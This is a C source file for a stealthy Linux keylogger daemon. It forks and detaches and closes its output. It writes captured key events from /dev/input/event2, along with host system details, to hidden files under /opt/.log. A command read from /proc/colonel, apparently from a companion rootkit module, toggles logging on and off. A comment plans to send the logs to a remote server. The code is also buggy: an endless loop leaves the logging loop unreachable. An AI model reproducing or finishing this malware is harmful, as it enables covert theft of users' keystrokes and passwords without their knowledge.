// REMOVE PRINTF WHEN DONE
#include <sys/types.h>
#include <sys/stat.h>
#include <sys/utsname.h>
#include <linux/input.h>
#include <errno.h>
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <string.h>
#include <time.h>
#include <fcntl.h>

// #define MAX(a,b) \
//    ({ typeof (a) _a = (a); \
//       typeof (b) _b = (b); \
//      _a < _b ? _a : _b; })		/* typesafe macro for retrieving the max value */


int main(void) {
	FILE *fp = NULL;
	FILE *evlog;
	FILE *ftty;
	struct utsname unameData;
	uname(&unameData);
	int fd;
	int dir;
	char listening = 0;
	char cmd[10];
	// struct proc_dir_entry *col_cmd;
	struct input_event ev;			/* using input_event so we know 
									 * what we're reading from the 
									 * event file */
	pid_t process_id = 0;
	pid_t sid = 0;
	process_id = fork();			/* fork a child process */

	if (process_id < 0) {
		printf("ERROR: fork failure\n");
		exit(1);
	}
	if (process_id > 0) {
		// REMOVE printf WHEN DONE
		printf("process_id of child process %d\n", process_id);
		exit(0);
	}

	umask(0);						/* unmask the file mode */

	sid = setsid();					/* set unique session for 
									 * child process */
	if (sid < 0) {
		exit(1);
	}

	chdir("/opt/");					/* change daemon working directory */

	close(STDIN_FILENO);
	close(STDOUT_FILENO);
	close(STDERR_FILENO);

	time_t curtime;
	time(&curtime);
	dir = mkdir("./.log", S_IRWXU);				/* log directory */
	fp = fopen("./.log/.log.txt", "a+"); 		/* daemon log */
	evlog = fopen("./.log/.evlog.txt", "a+");  	/* key log */
	fd = open("/dev/input/event2", O_RDONLY);	/* key event file */
	ftty = fopen("/proc/colonel","r");			/* will act as pseudo terminal */
	if (!ftty) {
		fprintf(fp, "%s -- ERROR: /proc/colonel not found", ctime(&curtime));
		return 1;
	}
	// findev = open('/proc/bus/input/devices', O_RDONLY);
/*
* DYNAMICALLY DISCOVER CORRECT EVENT (/proc/bus/input/devices) 327
* Send file out via libcurl to python server for translation
*/
	if (geteuid() != 0) {							/* check if user is root */
		fprintf(fp, "%s -- ERROR: user not root\n", ctime(&curtime));
		return 1;
	}
	if (NULL == evlog) {
		fprintf(fp, "%s -- ERROR: evlog couldn't be opened\n", ctime(&curtime));
		return 1;
	}

	fprintf(evlog, "\n\n%s", ctime(&curtime));		/* timestamp */
	fprintf(evlog, "%s\n%s\n%s | %s | %s\n\n-", 	/* system data */
			unameData.nodename, unameData.version,
			unameData.sysname, unameData.release, 
			unameData.machine);



	while(1) {
		fgets(cmd, sizeof(cmd), ftty);
		// int len = strlen(cmd) -1;
		// if ('\n' == cmd[len]) {			/* strips newline */
		// 	cmd[len] = 0;
		// }
		if (!strncmp(cmd, "toglis", sizeof(strlen(cmd)))) {
			listening = !listening;
		}
	}



	// read(ftty, &col_cmd, sizeof(struct proc_dir_entry));
	// if ("toglis" == col_cmd.)


// int write_colonel(struct file *file, const char __user *buff, unsigned long count, void *data) {
// 		if (!strncmp(buff, "toglis", MAX(6, count))) {		/*toggles listening -- turn the keylogger on/off */
// 			listening = !listening;
		
// 	    return count;
// 	}


	while(1) {
		fflush(fp);
		read(fd, &ev, sizeof(struct input_event));
		if(1 == ev.type && listening) {
			fprintf(evlog, "%i,%i-", ev.code, ev.value);
			fflush(evlog);
		}
	}

	fclose(evlog);
	fclose(fp);
	return 0;
}